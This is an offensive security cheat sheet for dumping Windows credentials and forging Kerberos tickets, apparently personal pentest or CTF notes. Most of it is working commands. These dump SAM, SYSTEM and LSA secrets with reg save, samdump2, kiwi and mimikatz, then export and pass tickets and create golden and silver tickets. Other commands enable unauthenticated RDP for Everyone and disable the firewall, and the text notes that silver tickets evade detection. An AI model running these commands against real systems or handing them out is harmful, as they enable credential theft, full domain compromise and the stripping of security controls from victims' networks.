# mimikatz/hashdump
Registry
--------

`REG QUERY "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /s` to view autologon stored passwords

SAM and SYSTEM
--------------

`reg save HKLM\SAM C:\Users\Administrator\Desktop\SAM`

`reg save HKLM\SYSTEM C:\Users\Administrator\Desktop\SYSTEM`

`samdump2 SYSTEM SAM`

KIWI
----

`load kiwi`

`lsa_dump_sam`

`getsystem` if not running as SYSTEM

```text-plain
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections  /t REG_DWORD /d 0 /f
```

Mimikatz
--------

run mimikatz.exe(used for dumping password hashes)

to activate rdp from terminal, use:

```text-plain
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD /d "0" /f
```

```text-plain
net localgroup "Remote Desktop Users" Everyone /add
```

```text-plain
netsh advfirewall set allprofiles state off #to disable firewall
```

```text-plain
lsadump::cache /user:user /pass:Password123! /kiwi
```

`privilege::debug`

`sekurlsa::tickets /export`  this will export all of the .kirbi tickets into the directory that you are currently in

`kerberos::ptt <ticket>`  try using an admin ticket for impersonation

`klist` to ensure we successfully impersonated the ticket by listing our cached tickets.

A silver ticket can sometimes be better used in engagements rather than a golden ticket because it is a little more discreet. If stealth and staying undetected matter then a silver ticket is probably a better option than a golden ticket however the approach to creating one is the exact same. The key difference between the two tickets is that a silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.

for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket.

`lsadump::lsa /inject /name:krbtgt` - This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.

`Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:`

\- This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.

Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket;